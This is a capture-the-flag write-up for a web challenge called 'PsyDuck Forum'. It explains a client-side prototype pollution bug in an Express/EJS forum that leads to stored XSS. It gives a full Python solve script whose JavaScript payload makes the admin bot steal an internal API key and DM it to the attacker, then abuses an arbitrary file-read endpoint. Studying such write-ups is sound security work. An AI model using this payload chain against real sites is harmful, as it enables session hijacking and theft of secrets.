---
title: "PsyDuck Forum"
ctf: "ICO 2026"
task: "Psyduck fantasy"
date: 2026-06-30
category: web
difficulty: medium
points: 20
flag_format: "ICO{...}"
author: "jt314"
---

> ℹ️ Read the [contest README](../../README.md) first — some challenge names, categories, and mappings are inferred.

# PsyDuck Forum

## Summary

PsyForum is an Express/EJS forum. A client-side prototype-pollution bug in the
DM conversation page can be triggered by a normal user's own profile
`settings` JSON, and it sinks into `innerHTML`. Chained with the forum's own
admin-bot "report a URL" feature, this becomes stored XSS in the admin's
browser, which is used to steal an internal API key from a DM and then read
`/flag.txt` through an arbitrary-file-read admin endpoint.

## Solution

### Step 1: Find the client-side pollution -> XSS gadget

`views/messages/conversation.ejs` fetches `/api/users/settings?username=<partner>`
(fully attacker-controlled via `POST /users/:username/edit`, which just
`JSON.stringify`s whatever `settings` object is posted) and merges it into a
plain object with a `for...in` + `Object.assign` loop:

```js
var card_config = { stage: 'BASIC' }
for (var key in profile.settings) {
  if (typeof profile.settings[key] === 'object' && profile.settings[key] !== null) {
    Object.assign(card_config[key] || {}, profile.settings[key]); // key can be "__proto__"
  } else {
    card_config[key] = profile.settings[key];
  }
}
...
if (window.chatConfig.badge) badge.innerHTML = window.chatConfig.badge; // sink
```

Setting `settings = {"__proto__": {"badge": "<img src=x onerror=...>"}}` makes
`card_config["__proto__"]` resolve to the real `Object.prototype`, so
`Object.assign` pollutes it globally on that page. Every object — including
`window.chatConfig` — now inherits `.badge`, which gets dumped straight into
`innerHTML`.

### Step 2: Weaponize it against the admin bot to steal the API key

The forum's `/report` endpoint makes an admin-controlled headless bot log in
as admin, visit an attacker-supplied `http://psyforum:3000/...` URL, wait 5s,
then log out. Pointing it at `/messages/<attacker>` makes the admin load the
attacker's poisoned settings and fire the XSS as `admin`. The payload reads
the `admin -> j3seer` DM (which contains an internal API key) via the admin's
own session, extracts the key, and DMs it back to the attacker. That key
unlocks `GET /settings?file=<path>`, an arbitrary file-read endpoint, used to
read `/flag.txt`.

```python
#!/usr/bin/env python3
import argparse, re, time, uuid, requests

def register(session, base, username, password):
    r = session.post(f"{base}/auth/register", json={
        "username": username, "display_name": username,
        "password": password, "password_confirm": password,
    })
    assert r.json().get("success"), r.text

def poison_profile(session, base, username, exfil_username):
    js_payload = (
        "fetch('/messages/j3seer').then(r=>r.text()).then(t=>{"
        "var m=t.match(/~\\s*([0-9a-fA-F]{20,40})/);"
        "var key=m?m[1]:'NOMATCH:'+t.length;"
        "fetch('/messages/" + exfil_username + "',{"
        "method:'POST',headers:{'Content-Type':'application/json'},"
        "body:JSON.stringify({body:key})})"
        "});"
    )
    badge = f"<img src=x onerror=\"{js_payload}\">"
    body = {
        "display_name": username,
        "bio": "just a regular user",
        "settings": {"pokemon_type": "", "__proto__": {"badge": badge}},
    }
    r = session.post(f"{base}/users/{username}/edit", json=body)
    assert r.json().get("success"), r.text

def trigger_bot(session, base, report_host, victim_username):
    url = f"http://{report_host}/messages/{victim_username}"
    session.post(f"{base}/report", json={"url": url}).raise_for_status()

def wait_for_exfil(session, base, from_username, timeout=30, interval=2):
    deadline = time.time() + timeout
    while time.time() < deadline:
        r = session.get(f"{base}/messages/{from_username}")
        m = re.search(r'class="message-bubble message-received">([0-9a-fA-F]{20,40})<', r.text)
        if m:
            return m.group(1)
        time.sleep(interval)
    raise RuntimeError("timed out waiting for XSS payload to exfiltrate the API key")

def read_flag(base, api_key, file_path="/flag.txt"):
    r = requests.get(f"{base}/settings", params={"file": file_path},
                      headers={"X-Api-Key": api_key})
    data = r.json()
    assert data.get("exists"), data
    return data["config"]

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--base", default="http://localhost:3000")
    parser.add_argument("--report-host", default="psyforum:3000")
    parser.add_argument("--flag-file", default="/flag.txt")
    args = parser.parse_args()

    username = f"hacker_{uuid.uuid4().hex[:8]}"
    session = requests.Session()

    register(session, args.base, username, "password123!")
    poison_profile(session, args.base, username, exfil_username=username)
    trigger_bot(session, args.base, args.report_host, victim_username=username)
    api_key = wait_for_exfil(session, args.base, from_username="admin")
    print(f"[+] stolen API key: {api_key}")

    flag_contents = read_flag(args.base, api_key, args.flag_file)
    print(flag_contents.strip())

if __name__ == "__main__":
    main()
```

```
$ python3 solve.py --base http://localhost:3000 --report-host psyforum:3000
[+] stolen API key: 4031c49c08d117827cd782389400c096
ICO{fake_flag}
```

## Flag

```
ICO{fake_flag}
```
